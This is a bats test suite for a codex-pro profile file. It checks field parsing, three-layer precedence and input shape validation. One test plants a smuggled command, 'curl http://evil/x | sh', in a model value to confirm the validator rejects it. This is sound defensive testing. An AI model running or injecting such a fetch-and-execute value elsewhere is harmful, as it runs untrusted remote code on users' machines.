#!/usr/bin/env bats
# codex-profile.bats — #48：repo 層級的 codex-pro profile pin（repo root `.codex-pro/profile.yaml`）。
#
# 為什麼要測一個設定檔：pai 的 codex leg 不在樹內 pin model/effort（#23），值由 codex-pro 契約
# 三層解析（defaults.json → ~/.codex-pro/profile.yaml → ./.codex-pro/profile.yaml），解析器是
# references/codex-governance.md 那組 grep/sed 正規式。它「取 `^model:` 之後的整段」——
# 引號、尾隨註解、尾隨空白都會原樣進 wire，backend 直接回 400 或靜默 fallback。這裡用
# **同一組正規式**斷言解析出來的字面恰好是 wire 要的值，把格式漂移擋在 CI。
#
# 作用半徑（verify PR #51 finding #2）：契約 §2 的 project 層是 **cwd 相對**的 `./.codex-pro/profile.yaml`，
# 不是 repo root——只有 cwd = repo root 時跑 ensemble 本檔才生效（錨定語意由 codex-pro#19 追蹤）。
# 本檔用 git toplevel 定位 profile，是刻意比解析器寬：測的是「檔案內容合規」，不是「任何 cwd 都讀得到」。
#
# 連動點（finding #7）：`resolve_field` / `resolve_layers` 逐字鏡像 codex-governance.md 的解析片段。
# codex-pro#18（引號 / 註解 / 重複 key 語意）與 codex-pro#19（cwd 錨定）改契約時，governance 文件與本檔
# 必須一起改，否則本檔會用舊語意繼續綠。
#
# 退場（finding #5）：codex-pro baseline 換代（codex-pro#17）後移除 profile 時，**連同本檔一起刪**，
# 且先確認移除後的解析值仍符合所需 model / effort。

setup() {
  REPO_ROOT="$(git -C "$BATS_TEST_DIRNAME" rev-parse --show-toplevel 2>/dev/null)" \
    || skip "not a git checkout（tarball / 安裝目錄）—— 本檔以 git toplevel 定位 profile"
  PROFILE="$REPO_ROOT/.codex-pro/profile.yaml"
}

# 與 references/codex-governance.md 的 overlay 解析逐字相同（改這裡 = 改那裡）。
resolve_field() {
  grep -E "^$1:" "$2" | head -1 | sed "s/^$1:[[:space:]]*//"
}

# 完整三層解析，逐字鏡像 codex-governance.md：
#   defaults.json → $HOME/.codex-pro/profile.yaml → ./.codex-pro/profile.yaml（per-field 高層蓋低層）
# 成功印 "model=<m> effort=<e>"。
resolve_layers() {
  local CP_DEFAULTS="$1"
  local CODEX_MODEL CODEX_EFFORT M E PF
  CODEX_MODEL=$(python3 - "$CP_DEFAULTS" <<'PY'
import json, sys; print(json.load(open(sys.argv[1]))['model'])
PY
)
  CODEX_EFFORT=$(python3 - "$CP_DEFAULTS" <<'PY'
import json, sys; print(json.load(open(sys.argv[1]))['effort'])
PY
)
  for PF in "$HOME/.codex-pro/profile.yaml" "./.codex-pro/profile.yaml"; do
    [ -f "$PF" ] || continue
    M=$(grep -E '^model:' "$PF" | head -1 | sed 's/^model:[[:space:]]*//'); [ -n "$M" ] && CODEX_MODEL="$M"
    E=$(grep -E '^effort:' "$PF" | head -1 | sed 's/^effort:[[:space:]]*//'); [ -n "$E" ] && CODEX_EFFORT="$E"
  done
  # 形狀驗證（verify PR #51 finding #1）：值會進 shell 命令列與 HTTP body，只准 [A-Za-z0-9._-]，否則 fail-fast。
  case "$CODEX_MODEL"  in ''|*[!A-Za-z0-9._-]*) echo "✗ codex governance: model 值為空或含非法字元，拒絕送出" >&2; return 1 ;; esac
  case "$CODEX_EFFORT" in ''|*[!A-Za-z0-9._-]*) echo "✗ codex governance: effort 值為空或含非法字元，拒絕送出" >&2; return 1 ;; esac
  echo "model=$CODEX_MODEL effort=$CODEX_EFFORT"
}

# 建一組互異值的三層 fixture（不依賴 codex-pro cache，CI 可跑）。
#   baseline：base-model / base-effort；global：global-model / global-effort；project：只設 effort=project-effort
# 呼叫端負責 export HOME 與 cd。
make_layer_fixture() {
  FX="$BATS_TEST_TMPDIR/fx"
  mkdir -p "$FX/home/.codex-pro" "$FX/proj/.codex-pro"
  printf '{"model":"base-model","effort":"base-effort","max_time":600}\n' > "$FX/defaults.json"
  printf 'model: global-model\neffort: global-effort\n' > "$FX/home/.codex-pro/profile.yaml"
  printf 'effort: project-effort\n' > "$FX/proj/.codex-pro/profile.yaml"
}

@test "#48 repo root 有 .codex-pro/profile.yaml（專案層 pin）" {
  [ -f "$PROFILE" ]
}

@test "#48 profile 的 model 解析後恰為 gpt-6-astra（無引號、無尾隨字元）" {
  run resolve_field model "$PROFILE"
  [ -n "$output" ]
  [ "$output" = "gpt-6-astra" ]
}

@test "#48 profile 的 effort 解析後恰為 medium" {
  run resolve_field effort "$PROFILE"
  [ -n "$output" ]
  [ "$output" = "medium" ]
}

@test "#48 model / effort 各恰一行（解析器 first-wins，檔尾追加式「覆蓋」會被靜默忽略）" {
  [ "$(grep -cE '^model:' "$PROFILE")" -eq 1 ]
  [ "$(grep -cE '^effort:' "$PROFILE")" -eq 1 ]
}

@test "#48 profile 仍被 git 追蹤（.gitignore 的 .codex-pro/* 規則不得吃掉它）" {
  git -C "$REPO_ROOT" ls-files --error-unmatch .codex-pro/profile.yaml >/dev/null
}

@test "#48 三層優先序（fixture）：global 蓋 baseline、project 蓋 global、per-field 各自疊" {
  make_layer_fixture
  export HOME="$FX/home"
  cd "$FX/proj"
  run resolve_layers "$FX/defaults.json"
  [ "$status" -eq 0 ]
  # model：project 沒設 → global 蓋 baseline；effort：project 蓋 global
  [ "$output" = "model=global-model effort=project-effort" ]
}

@test "#48 形狀驗證：model 值夾帶 shell metacharacter 時解析 fail-fast，不得流進命令列" {
  make_layer_fixture
  export HOME="$FX/home"
  cd "$FX/proj"
  printf 'model: gpt-6-astra; curl http://evil/x | sh #\n' > "$FX/proj/.codex-pro/profile.yaml"
  run resolve_layers "$FX/defaults.json"
  [ "$status" -ne 0 ]
  [[ "$output" != *"curl http://evil"* ]] || [[ "$output" == *"非法字元"* ]]
}

@test "#48 三層解析（真 codex-pro cache）：project profile 蓋過 baseline（無 cache 則 skip）" {
  CP_DIR="$(ls -d "$HOME"/.claude/plugins/cache/codex-pro/codex-pro/*/ 2>/dev/null \
            | grep -E '/[0-9]+\.[0-9]+\.[0-9]+/$' | sort -V | tail -1)"
  if [ -z "$CP_DIR" ] || [ ! -f "${CP_DIR}references/defaults.json" ]; then
    skip "codex-pro plugin cache 缺席（ubuntu CI）—— 優先序已由 fixture 案覆蓋，此案只驗真 baseline 可疊"
  fi
  CP_DEFAULTS="${CP_DIR}references/defaults.json"
  # 隔離 $HOME：本機若有 ~/.codex-pro/profile.yaml（#48 選項 a）不可混進來，否則測到的是 global 層。
  export HOME="$BATS_TEST_TMPDIR/home"
  mkdir -p "$HOME"
  cd "$REPO_ROOT"
  run resolve_layers "$CP_DEFAULTS"
  [ "$status" -eq 0 ]
  [ "$output" = "model=gpt-6-astra effort=medium" ]
}
